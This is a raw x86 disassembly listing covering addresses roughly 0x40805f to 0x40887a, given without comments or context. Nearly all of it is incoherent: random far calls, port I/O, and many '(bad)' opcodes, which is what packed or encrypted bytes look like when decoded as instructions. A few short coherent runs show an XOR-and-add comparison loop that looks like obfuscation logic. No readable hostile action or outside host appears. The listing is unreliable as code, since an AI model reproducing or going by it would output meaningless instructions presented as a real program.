  40805f:	or     bh,BYTE PTR [ebp+0x2156cb9d]
  408065:	jge    0x407ff2
  408067:	sahf   
  408068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408069:	cdq    
  40806a:	icebp  
  40806b:	add    DWORD PTR [edi+eax*1-0x6c2eb62f],edi
  408072:	inc    edx
  408073:	out    0x22,eax
  408075:	fisubr DWORD PTR [esi]
  408077:	pop    ecx
  408078:	inc    edx
  408079:	test   al,0x59
  40807b:	pop    ss
  40807c:	pop    esi
  40807d:	adc    BYTE PTR [esi+0x20],bh
  408080:	push   ss
  408081:	sub    dh,dl
  408083:	sbb    ah,BYTE PTR [eax+0x7e]
  408086:	cmp    ah,BYTE PTR [ebx+0x26]
  408089:	mov    ebp,0x59cd2b5c
  40808e:	ret    
  40808f:	push   0xffffffab
  408091:	mov    dl,0x0
  408093:	call   0xeea0:0x447b86ca
  40809a:	push   ebp
  40809b:	ficom  DWORD PTR [edx+ebx*1+0x1bb2ffc5]
  4080a2:	in     al,0xfe
  4080a4:	scas   eax,DWORD PTR es:[edi]
  4080a5:	jnp    0x40811e
  4080a7:	sar    edi,1
  4080a9:	adc    dh,bl
  4080ab:	shl    DWORD PTR [esi+0x27],0xd3
  4080af:	mov    esi,0xa5c88e39
  4080b4:	mov    ch,0xb8
  4080b6:	stos   DWORD PTR es:[edi],eax
  4080b7:	sub    BYTE PTR [edx-0xf168341],dh
  4080bd:	or     al,0xea
  4080bf:	js     0x4080a3
  4080c1:	(bad)  
  4080c2:	xor    al,0x62
  4080c4:	push   esi
  4080c5:	pop    ebx
  4080c6:	sub    BYTE PTR [ebp-0xc66f5d6],bl
  4080cc:	cmp    esp,DWORD PTR [eax+0x33d20d9e]
  4080d2:	rol    DWORD PTR [ebx],0xc6
  4080d5:	mov    DWORD PTR [edx],eax
  4080d7:	mov    eax,DWORD PTR [ebp-0x8]
  4080da:	xor    eax,ecx
  4080dc:	add    eax,esi
  4080de:	mov    DWORD PTR [ebp+0x8],eax
  4080e1:	mov    eax,DWORD PTR [ebp+0x8]
  4080e4:	jmp    0x4083ed
  4080e9:	ret    
  4080ea:	ror    ch,1
  4080ec:	rcr    ecx,0xc9
  4080ef:	rcl    esi,cl
  4080f1:	push   edx
  4080f2:	add    DWORD PTR [edx+0x4664e475],eax
  4080f8:	pop    ss
  4080f9:	hlt    
  4080fa:	fnstsw WORD PTR [eax+0x78]
  4080fd:	fs jle 0x408178
  408100:	js     0x408133
  408102:	adc    al,0x59
  408104:	cs pop ss
  408106:	jmp    0xc06b:0x37212f19
  40810d:	out    0x4c,eax
  40810f:	adc    BYTE PTR [eax+0x557ad7a5],dl
  408115:	dec    eax
  408117:	mov    ebp,0x5d32d5f9
  40811c:	jns    0x408129
  40811e:	lods   al,BYTE PTR ds:[esi]
  40811f:	jge    0x408175
  408121:	outs   dx,BYTE PTR ds:[esi]
  408122:	shr    DWORD PTR [eax+0x2b20f4d9],0x49
  408129:	push   esi
  40812a:	(bad)
  40812d:	sub    BYTE PTR [edx+edi*4],ah
  408130:	ret    0x842a
  408133:	mov    ds:0x5c0f5d95,al
  408138:	addr16 mov ch,0xfa
  40813b:	push   edx
  40813c:	fisttp WORD PTR [ebx+0x5b241f8c]
  408142:	xor    BYTE PTR [ebx],cl
  408144:	shl    DWORD PTR [ecx+ebp*8],0xe7
  408148:	loop   0x40816c
  40814a:	mov    edi,esi
  40814c:	mov    DWORD PTR [ebx-0x2f],edx
  40814f:	scas   eax,DWORD PTR es:[edi]
  408150:	dec    esp
  408151:	fsubr  DWORD PTR [ebx+0x4a8be40]
  408157:	dec    edi
  408158:	rol    bl,0xf6
  40815b:	test   al,0x55
  40815d:	test   al,0xf9
  40815f:	fisub  WORD PTR [ebx+0x599d67de]
  408165:	mov    edx,0x63773dc6
  40816a:	adc    BYTE PTR [ecx+edx*1],dh
  40816d:	mov    ebx,DWORD PTR [eax+esi*2-0xfe77f29]
  408174:	push   ds
  408175:	add    dh,BYTE PTR [edi-0x119b7001]
  40817b:	xor    edx,ebp
  40817d:	sbb    BYTE PTR [eax],cl
  40817f:	adc    ah,BYTE PTR [eax]
  408181:	jp     0x40813e
  408183:	retf   0x5af4
  408186:	loope  0x408185
  408188:	leave  
  408189:	jle    0x4081cd
  40818b:	sbb    al,0x5a
  40818d:	test   BYTE PTR [ecx+0x484e917a],ah
  408193:	jo     0x4081ad
  408195:	xchg   ebx,eax
  408196:	pshufw mm5,QWORD PTR [esi+0x1c],0x14
  40819b:	ss inc esi
  40819d:	idiv   DWORD PTR [eax+0x2afb0dbd]
  4081a3:	dec    ecx
  4081a4:	cmp    eax,0x52d35cda
  4081a9:	or     DWORD PTR [esi],edi
  4081ab:	push   0x650f8ad6
  4081b0:	ins    BYTE PTR es:[edi],dx
  4081b1:	sub    DWORD PTR [ecx+0x4bd03ba2],eax
  4081b7:	aam    0x3a
  4081b9:	mov    ch,0x1d
  4081bb:	mov    esi,ebx
  4081bd:	in     al,0xf5
  4081bf:	push   0xffffffa4
  4081c1:	ror    DWORD PTR ds:0x70254c85,0xd8
  4081c8:	fisttp QWORD PTR [esi+0x34]
  4081cb:	iret   
  4081cc:	shr    ah,cl
  4081ce:	aaa    
  4081cf:	test   DWORD PTR [edi-0x48eeb136],ebx
  4081d5:	jge    0x40820b
  4081d7:	inc    esp
  4081d8:	xchg   esp,eax
  4081d9:	cmp    al,bh
  4081db:	fnstcw WORD PTR [edi]
  4081dd:	int3   
  4081de:	repz xlat BYTE PTR ds:[ebx]
  4081e0:	pushf  
  4081e1:	ins    DWORD PTR es:[edi],dx
  4081e2:	in     eax,dx
  4081e3:	aad    0x32
  4081e5:	mov    cl,0x3a
  4081e7:	xor    eax,0x3131951e
  4081ec:	and    eax,0xdb46f2e5
  4081f1:	sbb    bl,BYTE PTR [ebx]
  4081f3:	ins    DWORD PTR es:[edi],dx
  4081f4:	cld    
  4081f5:	arpl   WORD PTR [edx+0x3d9f14cc],bx
  4081fb:	and    al,bh
  4081fd:	out    0xd6,al
  4081ff:	inc    edi
  408200:	xlat   BYTE PTR ds:[ebx]
  408201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408202:	mov    bl,0x59
  408204:	jno    0x40820c
  408206:	pop    ss
  408207:	popf   
  408208:	xor    al,0xf2
  40820a:	pop    ebx
  40820b:	fwait
  40820c:	add    eax,0xa40f1866
  408211:	imul   ebp,DWORD PTR [esi-0x62],0xe827545e
  408218:	push   ds
  408219:	pusha  
  40821a:	loope  0x4081a2
  40821c:	fwait
  40821d:	adc    eax,0x17459f04
  408222:	aas    
  408223:	out    0x6e,eax
  408225:	imul   esi,DWORD PTR fs:[edx-0x4],0xf9b9f3f9
  40822d:	jo     0x408260
  40822f:	cmp    eax,0xca56c29a
  408234:	ins    DWORD PTR es:[edi],dx
  408235:	dec    esp
  408236:	cli    
  408237:	call   DWORD PTR [ebx]
  408239:	inc    esi
  40823a:	inc    eax
  40823b:	push   es
  40823c:	and    esp,esi
  40823e:	(bad)  
  40823f:	(bad)  
  408240:	loope  0x4081d2
  408242:	cmp    DWORD PTR [ecx-0x8],edx
  408245:	(bad)  
  408246:	sub    dh,BYTE PTR [ecx+0x1aeb835c]
  40824c:	out    dx,eax
  40824d:	jecxz  0x4081d5
  40824f:	popf   
  408250:	mov    dh,BYTE PTR [ecx]
  408252:	sbb    DWORD PTR [edi+ebp*1+0x5f],0x4da5cbb5
  40825a:	cmp    al,0xb9
  40825c:	cmp    DWORD PTR [ebx+0x2d],esp
  40825f:	jmp    0x4082d6
  408261:	call   0xd17483e0
  408266:	fcom   QWORD PTR [ecx+edx*2]
  408269:	ficom  WORD PTR [ebp+0x7b2e4f20]
  40826f:	lahf   
  408270:	inc    ebp
  408271:	in     eax,dx
  408272:	pusha  
  408273:	dec    edi
  408274:	(bad)  
  408275:	mov    bl,0x28
  408277:	adc    eax,0x109fd005
  40827c:	outs   dx,DWORD PTR ds:[esi]
  40827d:	repnz repnz dec esp
  408280:	mov    bh,0xb5
  408282:	or     eax,DWORD PTR [ecx+ecx*4+0x74]
  408286:	test   al,0xa9
  408288:	pusha  
  408289:	xchg   edi,eax
  40828a:	out    0xfd,al
  40828c:	in     al,dx
  40828d:	aad    0xca
  40828f:	ja     0x4082d0
  408291:	fcomp  QWORD PTR [ecx]
  408293:	out    0xb1,al
  408295:	ins    DWORD PTR es:[edi],dx
  408296:	popf   
  408297:	jnp    0x408231
  408299:	add    esp,DWORD PTR [edi]
  40829b:	test   BYTE PTR [edx+0x1e4d7672],ch
  4082a1:	pop    edi
  4082a2:	dec    eax
  4082a3:	push   ebp
  4082a4:	xchg   esi,eax
  4082a5:	add    eax,0xeb18407e
  4082ab:	hlt    
  4082ac:	xchg   DWORD PTR [eax],edi
  4082ae:	ret    
  4082af:	or     DWORD PTR [eax],ebp
  4082b1:	mov    bh,0x99
  4082b3:	adc    edx,edx
  4082b5:	jne    0x408301
  4082b7:	gs sub bl,dl
  4082ba:	(bad)  
  4082bb:	xchg   ecx,eax
  4082bc:	mov    eax,ds:0x5b371f49
  4082c1:	ret    0x29
  4082c4:	fistp  DWORD PTR [eax+0x9bfa2c0]
  4082ca:	dec    esp
  4082cb:	maskmovq mm0,(bad)
  4082cc:	test   DWORD PTR [ebp-0x4e],0xe56b0292
  4082d3:	arpl   WORD PTR [edx],bp
  4082d5:	jb     0x40831d
  4082d7:	xor    edi,DWORD PTR [esi]
  4082d9:	fst    DWORD PTR [ecx+0x3fa54500]
  4082df:	cwde   
  4082e0:	not    BYTE PTR [ebx+eax*2+0x2ad47d8]
  4082e7:	and    eax,0x350924ad
  4082ec:	not    DWORD PTR [edi+0x1ab81d83]
  4082f2:	gs sub ecx,eax
  4082f5:	pop    edi
  4082f6:	int    0xb8
  4082f8:	mov    eax,ds:0xf13e5009
  4082fd:	inc    edx
  4082fe:	dec    bp
  408300:	jnp    0x4082ed
  408302:	mov    ebp,DWORD PTR [edx]
  408304:	pop    edi
  408305:	arpl   dx,sp
  408307:	push   esi
  408308:	mov    dl,0xb6
  40830a:	(bad)  
  40830b:	rol    edi,1
  40830d:	aad    0x26
  40830f:	in     al,dx
  408310:	lock pushf 
  408312:	inc    ebx
  408313:	and    bh,dl
  408315:	jl     0x40838e
  408317:	push   es
  408318:	rep stos DWORD PTR es:[edi],eax
  40831a:	test   al,0x1
  40831c:	retf   
  40831d:	repz cmp al,0x27
  408320:	int3   
  408321:	(bad)  
  408322:	fcmovb st,st(1)
  408324:	jmp    0x11fd:0x660afd4
  40832b:	push   cs
  40832c:	daa    
  40832d:	sub    eax,0xe2a88336
  408332:	je     0x40830e
  408334:	in     al,0xa8
  408336:	sbb    DWORD PTR [ebx+ecx*8-0x21],0x77
  40833b:	pop    ecx
  40833d:	out    dx,eax
  40833e:	pop    es
  40833f:	mov    dl,0xe0
  408341:	cdq    
  408342:	push   es
  408343:	and    DWORD PTR ds:0x7da7c6f0,ecx
  408349:	das    
  40834a:	xor    BYTE PTR [eax+0x4ba1343],al
  408350:	mov    es,WORD PTR [edx+0x1]
  408353:	iret   
  408354:	cs sub al,0xdd
  408357:	or     BYTE PTR [eax],0xa4
  40835a:	ds ja  0x4083be
  40835d:	not    ebp
  40835f:	add    ah,BYTE PTR [edx+0x7c]
  408362:	inc    eax
  408363:	push   edi
  408364:	sbb    al,bl
  408366:	shl    DWORD PTR [eax+0x6a47b647],cl
  40836c:	cs test eax,0x4c30f352
  408372:	and    dl,dh
  408374:	enter  0x2dc8,0x50
  408378:	and    al,0x19
  40837a:	cmp    eax,0x6a0de032
  40837f:	retf   
  408380:	pushf  
  408381:	adc    BYTE PTR [ebx],dh
  408383:	(bad)  
  408384:	jp     0x408360
  408386:	jmp    0x6fe99c5
  40838b:	loop   0x4083f4
  40838d:	mov    ch,ah
  40838f:	add    esi,DWORD PTR [eax-0x52]
  408392:	adc    eax,0xd49929ac
  408397:	stc    
  408398:	scas   eax,DWORD PTR es:[edi]
  408399:	mov    eax,ebx
  40839b:	mov    edx,0x1c11ce71
  4083a0:	ja     0x4083d5
  4083a2:	dec    ebp
  4083a3:	mov    esp,0xed6d572d
  4083a8:	in     al,0x43
  4083aa:	add    al,0x9f
  4083ac:	mov    eax,ds:0x2da6e22e
  4083b1:	mov    bh,0x69
  4083b3:	stos   BYTE PTR es:[edi],al
  4083b4:	clc    
  4083b5:	fstp   TBYTE PTR [eax+0x62b78d04]
  4083bb:	dec    ebp
  4083bc:	in     eax,dx
  4083bd:	xchg   ebx,eax
  4083be:	popa   
  4083bf:	imul   eax,DWORD PTR [esi],0xe7a289e0
  4083c5:	cmp    DWORD PTR [edx+0x6f],esi
  4083c8:	push   esi
  4083c9:	stos   BYTE PTR es:[edi],al
  4083ca:	out    0xec,al
  4083cc:	ins    BYTE PTR es:[edi],dx
  4083cd:	pushf  
  4083ce:	repz int3 
  4083d0:	fs leave 
  4083d2:	or     esp,ebp
  4083d4:	xlat   BYTE PTR ds:[ebx]
  4083d5:	inc    edi
  4083d6:	mov    dl,0x47
  4083d8:	sub    esi,eax
  4083da:	or     esp,DWORD PTR [esi]
  4083dc:	cmp    edi,DWORD PTR [edx]
  4083de:	adc    eax,0xabf77903
  4083e3:	(bad)  
  4083e5:	jmp    0x62717712
  4083ea:	pop    esi
  4083eb:	into   
  4083ec:	lea    ecx,[edx-0x7557fabc]
  4083f2:	push   ebp
  4083f3:	(bad)  
  4083f4:	cmp    al,dl
  4083f6:	je     0x408742
  4083fc:	mov    eax,DWORD PTR [ebp+0x8]
  4083ff:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408403:	mov    edx,DWORD PTR [ebp+0xc]
  408406:	cmp    al,BYTE PTR [edx]
  408408:	jne    0x408a71
  40840e:	mov    eax,DWORD PTR [ebp-0x8]
  408411:	mov    edx,DWORD PTR [ebp+0xc]
  408414:	movsx  edx,BYTE PTR [edx]
  408417:	xor    eax,ecx
  408419:	add    eax,esi
  40841b:	cmp    edx,eax
  40841d:	je     0x40875c
  408423:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  40842a:	jmp    0x408733
  40842f:	cmp    al,0xc8
  408431:	rcl    dl,0xd4
  408434:	fcmovu st,st(2)
  408436:	into   
  408437:	(bad)  
  408438:	leave  
  408439:	xchg   BYTE PTR [edi-0x4df7ebea],dl
  40843f:	loopne 0x408423
  408441:	js     0x4084bb
  408443:	fs jle 0x4084be
  408446:	js     0x4084a6
  408448:	aad    0xc8
  40844a:	fwait
  40844b:	mov    edx,0xad37be50
  408450:	xor    DWORD PTR [ebp+0x5c],esi
  408453:	out    dx,al
  408454:	pushf  
  408455:	dec    edi
  408456:	jnp    0x408486
  408458:	xor    al,0x6a
  40845a:	fmul   QWORD PTR ds:0xbb29cb0f
  408460:	cwde   
  408461:	dec    eax
  408462:	mov    al,ds:0x73f1bde2
  408467:	retf   
  408468:	jb     0x4084ab
  40846a:	lahf   
  40846b:	in     eax,0x8a
  40846d:	neg    dl
  40846f:	push   es
  408470:	pop    ecx
  408471:	xchg   ebp,eax
  408472:	lea    ebx,[edi]
  408474:	rcl    DWORD PTR [ecx-0x5f],cl
  408477:	ins    BYTE PTR es:[edi],dx
  408478:	leave  
  408479:	add    dh,BYTE PTR [edi]
  40847b:	das    
  40847c:	xor    dl,bh
  40847e:	dec    ecx
  40847f:	cmp    esp,edi
  408481:	scas   al,BYTE PTR es:[edi]
  408482:	cmp    DWORD PTR [ebx-0x32],edx
  408485:	fdivr  QWORD PTR [ecx-0x2f290fd8]
  40848b:	push   edx
  40848c:	adc    bl,BYTE PTR [esi-0x5d]
  40848f:	sahf   
  408490:	adc    eax,0xfe621f89
  408495:	inc    eax
  408496:	aad    0xbb
  408498:	inc    edi
  408499:	push   0x3bc564e5
  40849e:	or     al,BYTE PTR [eax-0x105ccd8b]
  4084a4:	cs ss test eax,0x60ec4dce
  4084ab:	ds cmc 
  4084ad:	shr    BYTE PTR [edi-0x17449d02],1
  4084b3:	adc    DWORD PTR [edx-0x5],ebx
  4084b6:	push   cs
  4084b7:	sub    al,0x79
  4084b9:	in     al,dx
  4084ba:	inc    ecx
  4084bb:	sti    
  4084bc:	jmp    0x4084da
  4084be:	dec    esp
  4084bf:	mov    al,ds:0x915b0327
  4084c4:	mov    eax,ds:0x1c93f6e2
  4084c9:	push   ds
  4084ca:	test   BYTE PTR [ebx+ebx*2-0x6b],dh
  4084ce:	mul    ebp
  4084d0:	push   ecx
  4084d1:	jmp    0x408544
  4084d3:	add    ch,bh
  4084d5:	add    dl,BYTE PTR [edx+0x2b3e1964]
  4084db:	pop    es
  4084dc:	(bad)  
  4084dd:	push   ss
  4084de:	adc    BYTE PTR [ecx],bl
  4084e0:	sub    dh,BYTE PTR [esp+ebx*4+0x79066001]
  4084e7:	pusha  
  4084e8:	xor    al,cl
  4084ea:	or     eax,0xdb4ddd20
  4084ef:	fisttp QWORD PTR [edi+0x3ab5f3cf]
  4084f5:	std    
  4084f6:	popf   
  4084f7:	stos   DWORD PTR es:[edi],eax
  4084f8:	inc    ebx
  4084f9:	mov    BYTE PTR ds:0x7d16d3a,dl
  4084ff:	xchg   ebx,eax
  408500:	adc    eax,0x84dc730b
  408505:	xchg   DWORD PTR [ecx],esp
  408507:	push   esp
  408508:	xchg   ch,dl
  40850a:	neg    DWORD PTR ds:0x29e97ba2
  408510:	aaa    
  408511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408512:	lods   eax,DWORD PTR ds:[esi]
  408513:	cmp    DWORD PTR [ecx+0x2b],esi
  408516:	ret    0xacee
  408519:	call   0xaf69:0x4ef10b1b
  408520:	dec    edi
  408521:	dec    edi
  408522:	and    al,0xa5
  408524:	leave  
  408525:	sbb    BYTE PTR [edx-0x3bc446],al
  40852b:	cmp    ebp,edx
  40852d:	repz call 0xb8f2:0x59e71c62
  408535:	add    DWORD PTR [esi],ecx
  408537:	pop    ebp
  408538:	and    DWORD PTR [esi-0x60],edi
  40853b:	jecxz  0x40857a
  40853d:	sbb    BYTE PTR [edx],ah
  40853f:	xor    DWORD PTR [edx+eax*4],ecx
  408542:	mov    WORD PTR [edi*2-0x35535770],fs
  408549:	ja     0x4084d3
  40854b:	imul   edx,DWORD PTR [eax-0x46],0x49
  40854f:	(bad)  
  408550:	setns  BYTE PTR [ecx+esi*2+0x791723de]
  408558:	shl    DWORD PTR [edi+0x72f83767],cl
  40855e:	int3   
  40855f:	bound  esp,QWORD PTR [ebx+edi*1]
  408562:	lds    esp,FWORD PTR [eax]
  408564:	sbb    al,0xc9
  408566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408567:	aad    0x78
  408569:	loopne 0x4084f6
  40856b:	xor    esp,DWORD PTR [ecx+0x4a735654]
  408571:	adc    dh,BYTE PTR [esi+0x79]
  408574:	fild   QWORD PTR [ecx]
  408576:	loope  0x408539
  408578:	mov    ebp,0x9fa566a6
  40857d:	xor    dl,dh
  40857f:	push   es
  408580:	inc    ecx
  408581:	push   ds
  408582:	inc    esi
  408583:	rcr    eax,1
  408585:	sbb    BYTE PTR [ebx+0x58],ch
  408588:	addr16 test ebp,0xbf38855a
  40858f:	or     DWORD PTR [esi+0x5c],eax
  408592:	xchg   ebp,ebx
  408594:	popf   
  408595:	fdivp  st(6),st
  408597:	add    al,0x36
  408599:	loop   0x408534
  40859b:	pop    esp
  40859c:	sub    DWORD PTR [eax],ebp
  40859e:	push   ecx
  40859f:	cdq    
  4085a0:	jg     0x408580
  4085a2:	std    
  4085a3:	jmp    0x408598
  4085a5:	mov    dh,0x9
  4085a7:	imul   edx,DWORD PTR [ecx+0x5c51ea41],0xf100897d
  4085b1:	test   al,0xbb
  4085b3:	adc    BYTE PTR [edi-0x7548e54c],ch
  4085b9:	xchg   ebx,eax
  4085ba:	adc    eax,0x3bc8d68a
  4085bf:	jno    0x40857c
  4085c1:	retf   
  4085c2:	cmp    BYTE PTR [edi+0x0],dh
  4085c5:	and    dl,BYTE PTR [edx-0x386cca70]
  4085cb:	inc    eax
  4085cc:	sub    ebx,ebx
  4085ce:	stos   DWORD PTR es:[edi],eax
  4085cf:	dec    ebx
  4085d0:	lock call 0xd64f:0xfb3637dc
  4085d8:	inc    ebp
  4085d9:	sub    BYTE PTR [edx-0x4e],al
  4085dc:	addr16 pop ecx
  4085de:	mov    edx,0x3d53f5
  4085e3:	clc    
  4085e4:	loope  0x40862d
  4085e6:	add    eax,0xf1d83382
  4085eb:	pop    esi
  4085ec:	pop    es
  4085ed:	jecxz  0x408639
  4085ef:	jbe    0x408648
  4085f1:	mov    esp,0x200c278e
  4085f6:	jge    0x4085fc
  4085f8:	mov    dl,0x2c
  4085fa:	push   edi
  4085fb:	pusha  
  4085fc:	jle    0x40860e
  4085fe:	jns    0x408585
  408600:	fwait
  408601:	or     BYTE PTR [ebp-0x36],0x69
  408605:	aaa    
  408606:	cs test eax,0x69648ea1
  40860c:	mov    dh,0xce
  40860e:	ror    BYTE PTR [ecx],cl
  408610:	ret    0x54e4
  408613:	call   0x5927:0x789df325
  40861a:	shl    DWORD PTR [edi-0x65667a53],cl
  408620:	lods   al,BYTE PTR ds:[esi]
  408621:	addr16 mov eax,ds:0x393e
  408625:	mov    bl,0xe5
  408627:	out    0x91,al
  408629:	mov    dh,BYTE PTR [edx+eiz*4-0x2c3768e9]
  408630:	in     al,0xd2
  408632:	lods   eax,DWORD PTR ds:[esi]
  408633:	xchg   edx,eax
  408634:	push   ebp
  408635:	cs aad 0x5d
  408638:	push   ss
  408639:	pushf  
  40863a:	mov    edx,0xda000a4d
  40863f:	pusha  
  408640:	sub    DWORD PTR [ebx+0x56],eax
  408643:	loopne 0x408695
  408645:	sar    DWORD PTR ds:0x9fbb3be,cl
  40864b:	xor    BYTE PTR [esi],bl
  40864d:	lods   eax,DWORD PTR ds:[esi]
  40864e:	aas    
  40864f:	pop    edi
  408650:	mov    dl,0xc1
  408652:	cmp    esi,DWORD PTR [eax-0x4d3eb794]
  408658:	call   DWORD PTR [ebx+0x62]
  40865b:	pop    es
  40865c:	xor    al,0x8f
  40865e:	aad    0x14
  408660:	enter  0x94bb,0x4
  408664:	mov    al,0xcc
  408666:	ds push esp
  408668:	and    BYTE PTR [eax+0x71],0xce
  40866c:	jns    0x4086a8
  40866e:	in     eax,0x85
  408670:	dec    edi
  408671:	or     eax,0xef1b1887
  408676:	or     dl,BYTE PTR [esi+0x23]
  408679:	add    al,0xc
  40867b:	xchg   edx,eax
  40867c:	loope  0x408689
  40867e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40867f:	pop    DWORD PTR [eax-0x61458dfe]
  408685:	mov    dl,0xea
  408687:	dec    esi
  408688:	sar    BYTE PTR [ebp-0x21ff0c9e],cl
  40868e:	in     al,0x96
  408690:	mov    BYTE PTR [ebx],dh
  408692:	push   edi
  408693:	sub    bl,al
  408695:	popa   
  408696:	shr    BYTE PTR [ebx+0x17],1
  408699:	inc    eax
  40869a:	sub    DWORD PTR [ebx+0x13],ebx
  40869d:	pop    ecx
  40869e:	stc    
  40869f:	shr    BYTE PTR [esi-0x1361be20],cl
  4086a5:	rol    esp,1
  4086a7:	lahf   
  4086a8:	and    eax,0x77790f87
  4086ad:	fistp  QWORD PTR ds:0xca7b1114
  4086b3:	call   0xd8fa:0xffd65333
  4086ba:	stos   BYTE PTR es:[edi],al
  4086bb:	mov    edi,0x6b4133a4
  4086c0:	ds jb  0x4086ac
  4086c3:	(bad)
  4086c6:	fsubr  QWORD PTR [edx]
  4086c8:	jle    0x408730
  4086ca:	aas    
  4086cb:	add    cl,BYTE PTR [edx]
  4086cd:	stos   BYTE PTR es:[edi],al
  4086ce:	lods   eax,DWORD PTR ds:[esi]
  4086cf:	or     dl,BYTE PTR [edi]
  4086d1:	loopne 0x40866b
  4086d3:	cmp    ah,BYTE PTR ds:0x936ad349
  4086d9:	sbb    esi,DWORD PTR [ecx+0x5a]
  4086dc:	and    al,0x53
  4086de:	jo     0x40868e
  4086e0:	stos   BYTE PTR es:[edi],al
  4086e1:	shr    BYTE PTR [edi+0x47fdc8ea],0xaf
  4086e8:	and    DWORD PTR [ebp-0x4bc1d440],edx
  4086ee:	xor    DWORD PTR [eax],ebp
  4086f0:	push   0x24
  4086f2:	loope  0x408694
  4086f4:	test   BYTE PTR [esp+ecx*4+0x1c96e144],al
  4086fb:	call   0x7cc5:0x61fd13c7
  408702:	ins    DWORD PTR es:[edi],dx
  408703:	adc    al,0xee
  408705:	cmc    
  408706:	sub    BYTE PTR [esi],0x5c
  408709:	and    ch,BYTE PTR [ebp-0x6b]
  40870c:	fldcw  WORD PTR [ebp+0x2c34d9ad]
  408712:	test   DWORD PTR [edx],ebx
  408714:	repnz add al,0xa2
  408717:	vpunpcklbw ymm5,ymm7,YMMWORD PTR [ebx+esi*8-0x7c7940ba]
  408720:	jge    0x4086ad
  408722:	mov    eax,ds:0x211c252c
  408727:	pop    edx
  408728:	dec    edx
  408729:	lds    edx,FWORD PTR [esi+ebp*8]
  40872c:	add    bh,ch
  40872e:	lahf   
  40872f:	pop    ds
  408730:	push   esi
  408731:	(bad)  
  408732:	jge    0x45ca6f7d
  408738:	in     al,dx
  408739:	mov    eax,DWORD PTR [ebp-0x14]
  40873c:	add    DWORD PTR [eax],0x705fa8e
  408742:	mov    eax,DWORD PTR [ebp-0x10]
  408745:	mov    edx,DWORD PTR [ebp+0x8]
  408748:	xor    eax,ecx
  40874a:	lea    eax,[eax+edx*1+0x327298]
  408751:	mov    DWORD PTR [ebp+0x8],eax
  408754:	inc    DWORD PTR [ebp+0xc]
  408757:	jmp    0x4080e1
  40875c:	mov    eax,DWORD PTR [ebp-0x10]
  40875f:	xor    eax,ecx
  408761:	mov    ecx,DWORD PTR [ebp+0x10]
  408764:	add    eax,esi
  408766:	jmp    0x408a6f
  40876b:	(bad)
  40876e:	aas    
  40876f:	fld    st(3)
  408771:	(bad)  
  408773:	add    edi,DWORD PTR [ebp-0x7e]
  408776:	sahf   
  408777:	push   edx
  408778:	pusha  
  408779:	or     DWORD PTR [ebx+0x7878e7cc],edi
  40877f:	fs jle 0x4087fa
  408782:	js     0x4087ad
  408784:	outs   dx,DWORD PTR ds:[esi]
  408785:	popa   
  408786:	adc    ebx,DWORD PTR [edx+0x28e5eb2d]
  40878c:	add    al,ah
  40878e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40878f:	inc    edi
  408790:	pop    esi
  408791:	outs   dx,BYTE PTR ds:[esi]
  408792:	push   ebx
  408793:	(bad)  
  408795:	and    DWORD PTR [eax+0x675c8d66],esp
  40879b:	dec    eax
  40879c:	inc    esp
  40879d:	jbe    0x4087db
  40879f:	cmc    
  4087a0:	imul   ecx,DWORD PTR [ebp-0x73],0xffffffa3
  4087a4:	cmp    edx,DWORD PTR [eax]
  4087a6:	push   edi
  4087a7:	arpl   cx,dx
  4087a9:	and    DWORD PTR ds:0xe85f20ed,esi
  4087af:	cmp    dl,dh
  4087b1:	repnz retf 
  4087b3:	adc    dl,ch
  4087b5:	sub    DWORD PTR [ecx-0x5c],eax
  4087b8:	dec    BYTE PTR [ebp+0x493173e4]
  4087be:	sub    eax,DWORD PTR [edi+0x2cc5ee95]
  4087c4:	push   0x25
  4087c6:	sahf   
  4087c7:	ds ss mov esi,0x7eac780
  4087ce:	or     ebp,edi
  4087d0:	test   DWORD PTR [eax+0x5b],esi
  4087d3:	add    BYTE PTR [ecx+esi*8+0x72],0x98
  4087d8:	jnp    0x4087bc
  4087da:	and    BYTE PTR [ebp-0x7103c499],bh
  4087e0:	jae    0x408804
  4087e2:	mov    ebx,0x86e388d5
  4087e7:	inc    DWORD PTR [edx]
  4087e9:	cwde   
  4087ea:	inc    edx
  4087eb:	lahf   
  4087ec:	ss es inc eax
  4087ef:	fnsave [ecx-0x2e417a50]
  4087f5:	mov    al,0xac
  4087f7:	pop    ds
  4087f8:	push   esi
  4087f9:	sbb    al,0xa7
  4087fb:	gs (bad) 
  4087fd:	retf   0xf61d
  408800:	int3   
  408801:	jge    0x4087a1
  408803:	or     DWORD PTR [edx-0x5caa26b6],ebp
  408809:	rcl    DWORD PTR ds:0xab004691,cl
  40880f:	sahf   
  408810:	xor    al,0xb1
  408812:	add    al,0x58
  408814:	xchg   ebx,eax
  408815:	add    dh,BYTE PTR [ebx-0x4f]
  408818:	cli    
  408819:	inc    eax
  40881a:	pop    esp
  40881c:	jp     0x4087ab
  40881e:	dec    esp
  40881f:	xchg   DWORD PTR [edx+ebp*4+0x7b],esi
  408823:	or     eax,0xf8fea0e4
  408828:	sbb    esp,esp
  40882a:	mov    ds:0xe422d6a7,eax
  40882f:	add    BYTE PTR [eax-0x6baa68c0],bl
  408835:	mov    al,0x8c
  408837:	or     ah,BYTE PTR [edx]
  408839:	xchg   ecx,eax
  40883a:	jne    0x4088b9
  40883c:	cdq    
  40883d:	xor    eax,0x11795be8
  408842:	fsub   DWORD PTR [ebx]
  408844:	sar    dh,0xa0
  408847:	aas    
  408848:	mov    ds:0xa1c97c3a,al
  40884d:	daa    
  40884e:	mov    al,0xb
  408850:	lea    ebp,[eax-0x7d]
  408853:	inc    eax
  408854:	jecxz  0x4088b1
  408856:	adc    ch,ch
  408858:	je     0x40883a
  40885a:	sub    DWORD PTR [edi],0xfffffff1
  40885d:	rcr    DWORD PTR [ebx-0xf],cl
  408860:	inc    eax
  408861:	neg    DWORD PTR [ebp+0x257bb6d5]
  408867:	clc    
  408868:	and    BYTE PTR [esi],dl
  40886a:	setge  BYTE PTR [edi+0x44d3540e]
  408871:	retf   0x1d69
  408874:	cmp    eax,edi
  408876:	(bad)  
  408877:	sub    al,0xa0
  408879:	pop    eax
  40887a:	sbb    ebp,DWORD PTR [ebp+0x48]
